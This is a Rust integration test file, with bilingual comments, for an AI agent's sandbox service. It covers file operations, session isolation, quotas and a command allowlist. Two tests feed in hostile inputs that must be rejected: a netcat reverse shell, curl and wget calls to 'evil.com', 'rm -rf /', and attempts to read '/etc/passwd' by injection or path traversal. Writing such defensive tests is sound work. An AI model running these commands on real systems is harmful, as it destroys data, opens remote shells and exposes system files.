//! Integration tests for SandboxService.
//! SandboxService 的集成测试。
//!
//! Tests end-to-end file operations through the gRPC service,
//! 端到端验证 gRPC service 中的文件操作、
//! session isolation, quota enforcement, and safe command execution.
//! session 隔离、quota 约束以及安全命令执行。

use shannon_agent_core::sandbox_service::{
    proto::{sandbox_service_server::SandboxService, *},
    SandboxConfig, SandboxServiceImpl,
};
use tempfile::TempDir;
use tonic::Request;

/// Helper to create a sandbox service for testing
/// 创建用于测试的 sandbox service 的辅助函数
fn create_test_service(temp: &TempDir) -> SandboxServiceImpl {
    SandboxServiceImpl::new(temp.path().to_path_buf())
}

/// Helper to create a sandbox service with custom config
/// 创建带自定义配置的 sandbox service 的辅助函数
fn create_test_service_with_config(temp: &TempDir, config: SandboxConfig) -> SandboxServiceImpl {
    SandboxServiceImpl::with_config(temp.path().to_path_buf(), config)
}

mod file_operations {
    use super::*;

    #[tokio::test]
    async fn test_write_and_read_roundtrip() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Write a file
        // 写入文件
        let write_req = FileWriteRequest {
            session_id: "test-session".to_string(),
            path: "test.txt".to_string(),
            content: "Hello, WASI Sandbox!".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        let write_resp = service.file_write(Request::new(write_req)).await.unwrap();
        let write_inner = write_resp.into_inner();
        assert!(write_inner.success, "Write should succeed");
        assert_eq!(write_inner.bytes_written, 20);

        // Read it back
        // 再读回
        let read_req = FileReadRequest {
            session_id: "test-session".to_string(),
            path: "test.txt".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        let read_resp = service.file_read(Request::new(read_req)).await.unwrap();
        let read_inner = read_resp.into_inner();
        assert!(read_inner.success, "Read should succeed");
        assert_eq!(read_inner.content, "Hello, WASI Sandbox!");
    }

    #[tokio::test]
    async fn test_append_mode() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Initial write
        // 首次写入
        let write_req1 = FileWriteRequest {
            session_id: "append-test".to_string(),
            path: "log.txt".to_string(),
            content: "Line 1\n".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        service.file_write(Request::new(write_req1)).await.unwrap();

        // Append
        // 追加写入
        let write_req2 = FileWriteRequest {
            session_id: "append-test".to_string(),
            path: "log.txt".to_string(),
            content: "Line 2\n".to_string(),
            append: true,
            create_dirs: false,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        service.file_write(Request::new(write_req2)).await.unwrap();

        // Read and verify
        // 读取并校验
        let read_req = FileReadRequest {
            session_id: "append-test".to_string(),
            path: "log.txt".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        let resp = service.file_read(Request::new(read_req)).await.unwrap();
        assert_eq!(resp.into_inner().content, "Line 1\nLine 2\n");
    }

    #[tokio::test]
    async fn test_create_dirs() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Write to nested path with create_dirs=true
        // 以 create_dirs=true 写入嵌套路径
        let write_req = FileWriteRequest {
            session_id: "nested-test".to_string(),
            path: "deep/nested/dir/file.txt".to_string(),
            content: "Nested content".to_string(),
            append: false,
            create_dirs: true,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        let resp = service.file_write(Request::new(write_req)).await.unwrap();
        assert!(resp.into_inner().success);

        // Verify file exists
        // 确认文件存在
        let read_req = FileReadRequest {
            session_id: "nested-test".to_string(),
            path: "deep/nested/dir/file.txt".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        let resp = service.file_read(Request::new(read_req)).await.unwrap();
        assert_eq!(resp.into_inner().content, "Nested content");
    }

    #[tokio::test]
    async fn test_list_files() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Create some files
        // 创建一些文件
        for name in &["a.txt", "b.py", "c.rs"] {
            let req = FileWriteRequest {
                session_id: "list-test".to_string(),
                path: name.to_string(),
                content: "content".to_string(),
                append: false,
                create_dirs: false,
                encoding: "utf-8".to_string(),
                user_id: String::new(),
            };
            service.file_write(Request::new(req)).await.unwrap();
        }

        // List all files
        // 列出所有文件
        let list_req = FileListRequest {
            session_id: "list-test".to_string(),
            path: "".to_string(),
            pattern: "".to_string(),
            recursive: false,
            include_hidden: false,
            user_id: String::new(),
        };
        let resp = service.file_list(Request::new(list_req)).await.unwrap();
        let inner = resp.into_inner();
        assert!(inner.success);
        assert_eq!(inner.file_count, 3);
    }

    #[tokio::test]
    async fn test_list_files_with_pattern() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Create mixed files
        // 创建多种类型的文件
        for name in &["test1.txt", "test2.txt", "other.py", "readme.md"] {
            let req = FileWriteRequest {
                session_id: "pattern-test".to_string(),
                path: name.to_string(),
                content: "x".to_string(),
                append: false,
                create_dirs: false,
                encoding: "utf-8".to_string(),
                user_id: String::new(),
            };
            service.file_write(Request::new(req)).await.unwrap();
        }

        // List only .txt files
        // 仅列出 .txt 文件
        let list_req = FileListRequest {
            session_id: "pattern-test".to_string(),
            path: "".to_string(),
            pattern: "*.txt".to_string(),
            recursive: false,
            include_hidden: false,
            user_id: String::new(),
        };
        let resp = service.file_list(Request::new(list_req)).await.unwrap();
        let inner = resp.into_inner();
        assert!(inner.success);
        assert_eq!(inner.file_count, 2);
    }
}

mod session_isolation {
    use super::*;

    #[tokio::test]
    async fn test_separate_workspaces() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Write to session A
        // 写入 session A
        let req_a = FileWriteRequest {
            session_id: "session-a".to_string(),
            path: "secret.txt".to_string(),
            content: "Session A secret".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        service.file_write(Request::new(req_a)).await.unwrap();

        // Write to session B
        // 写入 session B
        let req_b = FileWriteRequest {
            session_id: "session-b".to_string(),
            path: "secret.txt".to_string(),
            content: "Session B secret".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        service.file_write(Request::new(req_b)).await.unwrap();

        // Read from session A
        // 从 session A 读取
        let read_a = FileReadRequest {
            session_id: "session-a".to_string(),
            path: "secret.txt".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        let resp_a = service.file_read(Request::new(read_a)).await.unwrap();
        assert_eq!(resp_a.into_inner().content, "Session A secret");

        // Read from session B
        // 从 session B 读取
        let read_b = FileReadRequest {
            session_id: "session-b".to_string(),
            path: "secret.txt".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        let resp_b = service.file_read(Request::new(read_b)).await.unwrap();
        assert_eq!(resp_b.into_inner().content, "Session B secret");
    }

    #[tokio::test]
    async fn test_path_traversal_blocked() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Create a file in session A
        // 在 session A 中创建文件
        let req = FileWriteRequest {
            session_id: "session-a".to_string(),
            path: "data.txt".to_string(),
            content: "Private data".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        service.file_write(Request::new(req)).await.unwrap();

        // Try to read from session B using path traversal
        // 尝试用路径穿越从 session B 读取
        let read_req = FileReadRequest {
            session_id: "session-b".to_string(),
            path: "../session-a/data.txt".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        let resp = service.file_read(Request::new(read_req)).await;

        // Should be blocked
        // 应被拦截
        match resp {
            Ok(r) => {
                let inner = r.into_inner();
                assert!(!inner.success || inner.content.is_empty());
            }
            Err(e) => {
                assert!(
                    e.code() == tonic::Code::PermissionDenied || e.code() == tonic::Code::NotFound
                );
            }
        }
    }

    #[tokio::test]
    async fn test_absolute_path_blocked() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Try to read an absolute path
        // 尝试读取绝对路径
        let read_req = FileReadRequest {
            session_id: "test".to_string(),
            path: "/etc/passwd".to_string(),
            max_bytes: 0,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        let resp = service.file_read(Request::new(read_req)).await;

        // Should fail
        // 应当失败
        match resp {
            Ok(r) => assert!(!r.into_inner().success),
            Err(_) => {} // Also acceptable
        }
    }
}

mod quota_enforcement {
    use super::*;

    #[tokio::test]
    async fn test_quota_exceeded_blocked() {
        let temp = TempDir::new().unwrap();
        let config = SandboxConfig {
            max_workspace_bytes: 100, // Very small quota
            ..Default::default()
        };
        let service = create_test_service_with_config(&temp, config);

        // Try to write a large file
        // 尝试写入大文件
        let req = FileWriteRequest {
            session_id: "quota-test".to_string(),
            path: "large.txt".to_string(),
            content: "x".repeat(200), // 200 bytes, exceeds 100 byte quota
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        let resp = service.file_write(Request::new(req)).await;

        // Should fail with ResourceExhausted
        // 应以 ResourceExhausted 失败
        assert!(resp.is_err());
        assert_eq!(resp.unwrap_err().code(), tonic::Code::ResourceExhausted);
    }

    #[tokio::test]
    async fn test_quota_allows_within_limit() {
        let temp = TempDir::new().unwrap();
        let config = SandboxConfig {
            max_workspace_bytes: 1000, // 1KB quota
            ..Default::default()
        };
        let service = create_test_service_with_config(&temp, config);

        // Write within quota
        // 在 quota 内写入
        let req = FileWriteRequest {
            session_id: "quota-ok".to_string(),
            path: "small.txt".to_string(),
            content: "x".repeat(100), // 100 bytes
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        let resp = service.file_write(Request::new(req)).await.unwrap();
        assert!(resp.into_inner().success);
    }
}

mod e2e_integration {
    use shannon_agent_core::safe_commands::SafeCommand;
    use shannon_agent_core::workspace::WorkspaceManager;
    use tempfile::TempDir;

    #[tokio::test]
    async fn test_full_session_workflow() {
        let temp = TempDir::new().unwrap();
        let manager = WorkspaceManager::new(temp.path().to_path_buf());

        // 1. Get workspace for a session (creates it)
        // 1. 获取 session workspace（不存在则创建）
        let workspace = manager.get_workspace("test-session-001").unwrap();
        assert!(workspace.exists());
        assert!(workspace.is_dir());

        // 2. Write a file to workspace
        // 2. 向 workspace 写入文件
        let file_path = workspace.join("data.txt");
        let content = "Hello from E2E test!";
        std::fs::write(&file_path, content).unwrap();

        // 3. Read file back and verify content
        // 3. 读回文件并校验内容
        let read_content = std::fs::read_to_string(&file_path).unwrap();
        assert_eq!(read_content, content);

        // 4. List files and verify count
        // 4. 列出文件并校验数量
        let entries: Vec<_> = std::fs::read_dir(&workspace)
            .unwrap()
            .filter_map(|e| e.ok())
            .collect();
        assert_eq!(entries.len(), 1);
        assert!(entries[0].file_name().to_str().unwrap() == "data.txt");

        // 5. Execute SafeCommand::parse("cat data.txt") and verify output
        // 5. 执行 SafeCommand::parse("cat data.txt") 并校验输出
        let cmd = SafeCommand::parse("cat data.txt").unwrap();
        let output = cmd.execute(&workspace).unwrap();
        assert_eq!(output.exit_code, 0);
        assert_eq!(output.stdout, content);

        // 6. Cleanup
        // 6. 清理
        manager.delete_workspace("test-session-001").unwrap();
        assert!(!workspace.exists());
    }

    #[tokio::test]
    async fn test_cross_session_isolation() {
        let temp = TempDir::new().unwrap();
        let manager = WorkspaceManager::new(temp.path().to_path_buf());

        // 1. Create two sessions
        // 1. 创建两个 session
        let workspace_a = manager.get_workspace("session-a").unwrap();
        let workspace_b = manager.get_workspace("session-b").unwrap();

        // 2. Write secret.txt to session_a
        // 2. 向 session_a 写入 secret.txt
        let secret_content = "Top secret data for session A only!";
        std::fs::write(workspace_a.join("secret.txt"), secret_content).unwrap();

        // 3. Verify session_b cannot see the file
        // 3. 确认 session_b 看不到该文件
        let secret_in_b = workspace_b.join("secret.txt");
        assert!(
            !secret_in_b.exists(),
            "session-b should not have access to session-a's secret.txt"
        );

        // Verify listing session-b shows no files
        // 确认列出 session-b 时为空
        let entries: Vec<_> = std::fs::read_dir(&workspace_b)
            .unwrap()
            .filter_map(|e| e.ok())
            .collect();
        assert_eq!(entries.len(), 0, "session-b workspace should be empty");

        // 4. Verify attempting to cat ../session-a/secret.txt fails
        // 4. 确认 cat ../session-a/secret.txt 会失败
        let cmd = SafeCommand::parse("cat ../session-a/secret.txt").unwrap();
        let result = cmd.execute(&workspace_b);
        assert!(
            result.is_err(),
            "Path traversal to session-a should be blocked"
        );

        // Also test that is_within_workspace correctly rejects cross-session paths
        // 同时验证 is_within_workspace 能正确拒绝跨 session 路径
        let cross_session_path = workspace_b.join("../session-a/secret.txt");
        let within_b = manager.is_within_workspace("session-b", &cross_session_path);
        assert!(
            within_b.is_err() || !within_b.unwrap(),
            "Cross-session path should not be within session-b workspace"
        );

        // 5. Cleanup
        // 5. 清理
        manager.delete_workspace("session-a").unwrap();
        manager.delete_workspace("session-b").unwrap();
        assert!(!workspace_a.exists());
        assert!(!workspace_b.exists());
    }
}

mod safe_commands {
    use super::*;

    #[tokio::test]
    async fn test_ls_command() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Create files
        // 创建文件
        let req = FileWriteRequest {
            session_id: "cmd-test".to_string(),
            path: "file1.txt".to_string(),
            content: "content".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        service.file_write(Request::new(req)).await.unwrap();

        // Execute ls
        // 执行 ls
        let cmd_req = CommandRequest {
            session_id: "cmd-test".to_string(),
            command: "ls".to_string(),
            timeout_seconds: 5,
            user_id: String::new(),
        };
        let resp = service
            .execute_command(Request::new(cmd_req))
            .await
            .unwrap();
        let inner = resp.into_inner();
        assert!(inner.success);
        assert!(inner.stdout.contains("file1.txt"));
    }

    #[tokio::test]
    async fn test_cat_command() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Create file
        // 创建文件
        let req = FileWriteRequest {
            session_id: "cat-test".to_string(),
            path: "data.txt".to_string(),
            content: "Hello from cat".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        service.file_write(Request::new(req)).await.unwrap();

        // Execute cat
        // 执行 cat
        let cmd_req = CommandRequest {
            session_id: "cat-test".to_string(),
            command: "cat data.txt".to_string(),
            timeout_seconds: 5,
            user_id: String::new(),
        };
        let resp = service
            .execute_command(Request::new(cmd_req))
            .await
            .unwrap();
        let inner = resp.into_inner();
        assert!(inner.success);
        assert_eq!(inner.stdout, "Hello from cat");
    }

    #[tokio::test]
    async fn test_mkdir_and_touch() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Get workspace first
        // 先获取 workspace
        let _ = service
            .file_list(Request::new(FileListRequest {
                session_id: "mkdir-test".to_string(),
                path: "".to_string(),
                ..Default::default()
            }))
            .await;

        // Create directory
        // 创建目录
        let cmd1 = CommandRequest {
            session_id: "mkdir-test".to_string(),
            command: "mkdir -p subdir/nested".to_string(),
            timeout_seconds: 5,
            user_id: String::new(),
        };
        service.execute_command(Request::new(cmd1)).await.unwrap();

        // Create file
        // 创建文件
        let cmd2 = CommandRequest {
            session_id: "mkdir-test".to_string(),
            command: "touch subdir/nested/file.txt".to_string(),
            timeout_seconds: 5,
            user_id: String::new(),
        };
        service.execute_command(Request::new(cmd2)).await.unwrap();

        // Verify with ls
        // 用 ls 验证
        let cmd3 = CommandRequest {
            session_id: "mkdir-test".to_string(),
            command: "ls subdir/nested".to_string(),
            timeout_seconds: 5,
            user_id: String::new(),
        };
        let resp = service.execute_command(Request::new(cmd3)).await.unwrap();
        assert!(resp.into_inner().stdout.contains("file.txt"));
    }

    #[tokio::test]
    async fn test_dangerous_command_rejected() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        let dangerous_commands = vec![
            "curl http://evil.com",
            "wget http://evil.com",
            "bash -c 'echo pwned'",
            "python -c 'print(1)'",
            "nc -e /bin/sh 1.2.3.4 4444",
        ];

        for cmd in dangerous_commands {
            let req = CommandRequest {
                session_id: "dangerous".to_string(),
                command: cmd.to_string(),
                timeout_seconds: 5,
                user_id: String::new(),
            };
            let resp = service.execute_command(Request::new(req)).await.unwrap();
            let inner = resp.into_inner();
            assert!(
                !inner.success,
                "Dangerous command should be rejected: {}",
                cmd
            );
            assert!(
                inner.error.contains("not allowed"),
                "Error should mention 'not allowed' for: {}",
                cmd
            );
        }
    }

    #[tokio::test]
    async fn test_shell_metacharacters_blocked() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        let injection_attempts = vec![
            "ls | cat /etc/passwd",
            "ls; rm -rf /",
            "ls && echo pwned",
            "ls || echo fallback",
            "echo $(whoami)",
            "echo `id`",
        ];

        for cmd in injection_attempts {
            let req = CommandRequest {
                session_id: "injection".to_string(),
                command: cmd.to_string(),
                timeout_seconds: 5,
                user_id: String::new(),
            };
            let resp = service.execute_command(Request::new(req)).await.unwrap();
            let inner = resp.into_inner();
            assert!(
                !inner.success,
                "Shell metacharacter should be blocked: {}",
                cmd
            );
        }
    }

    #[tokio::test]
    async fn test_grep_command() {
        let temp = TempDir::new().unwrap();
        let service = create_test_service(&temp);

        // Create file with content
        // 创建含内容的文件
        let req = FileWriteRequest {
            session_id: "grep-test".to_string(),
            path: "log.txt".to_string(),
            content: "INFO: Starting\nERROR: Failed\nINFO: Done".to_string(),
            append: false,
            create_dirs: false,
            encoding: "utf-8".to_string(),
            user_id: String::new(),
        };
        service.file_write(Request::new(req)).await.unwrap();

        // Grep for ERROR
        // 搜索 ERROR
        let cmd_req = CommandRequest {
            session_id: "grep-test".to_string(),
            command: "grep ERROR log.txt".to_string(),
            timeout_seconds: 5,
            user_id: String::new(),
        };
        let resp = service
            .execute_command(Request::new(cmd_req))
            .await
            .unwrap();
        let inner = resp.into_inner();
        assert!(inner.success);
        assert!(inner.stdout.contains("ERROR: Failed"));
        assert!(!inner.stdout.contains("INFO"));
    }
}
